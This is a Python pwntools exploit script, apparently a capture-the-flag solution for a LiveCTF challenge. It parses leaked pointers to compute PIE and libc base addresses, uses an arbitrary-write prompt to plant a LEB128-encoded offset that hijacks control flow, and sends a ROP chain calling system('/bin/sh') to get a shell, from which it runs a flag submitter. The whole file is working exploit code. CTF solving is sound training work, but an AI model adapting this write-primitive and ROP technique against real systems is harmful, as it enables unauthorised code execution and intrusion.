from pwn import *
import leb128

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))

s.recvuntil(b"main:")
main_ptr = s.recvline().strip()
main_ptr = int(main_ptr,16)

s.recvuntil(b"var:")
var_ptr = s.recvline().strip()
var_ptr = int(var_ptr,16)

s.recvuntil(b"printf:")
printf_ptr = s.recvline().strip()
printf_ptr = int(printf_ptr,16)


pie = main_ptr - 0x14EE 
libc_base = printf_ptr - 0x60100

success("main_ptr: %s" % hex(main_ptr))
success("var_ptr: %s" % hex(var_ptr))
success("printf_ptr: %s" % hex(printf_ptr))

success("pie: %s" % hex(pie))
success("libc_base: %s" % hex(libc_base))

eh_start = pie + 0x20B8
got_base = pie + 0x10e0

def write_val(addr, val, again=True):
    s.sendlineafter(b"Where to write?", hex(addr).encode())
    s.sendlineafter(b"What to write?", hex(val).encode())
    if again:
        s.sendafter(b"again?", b"0x1 ")
    else:
        s.sendafter(b"again?", b"0x0 ")

# target = pie + 0x139b
target = libc_base+0x87080+1

offset = (target - (pie + 0x12e0))

num = int.from_bytes(leb128.i.encode(offset), "little")
write_val(pie+0x227f, num, again=False)

# write_val(pie+0x227c, 0x4890003bb0503D7, again=False)

# write_val(got_base, 0xdead, again=False)

pop_rdi = 0x000000000010f75b+libc_base
sh = 0x001cb42f+libc_base
system = 362320 + libc_base
payload = b''
payload += p64(0x00000000000b2220+libc_base)[1:]
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(sh)
payload += p64(system)
s.sendline(payload)

s.sendline(b"./submitter")
flag = s.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
s.interactive()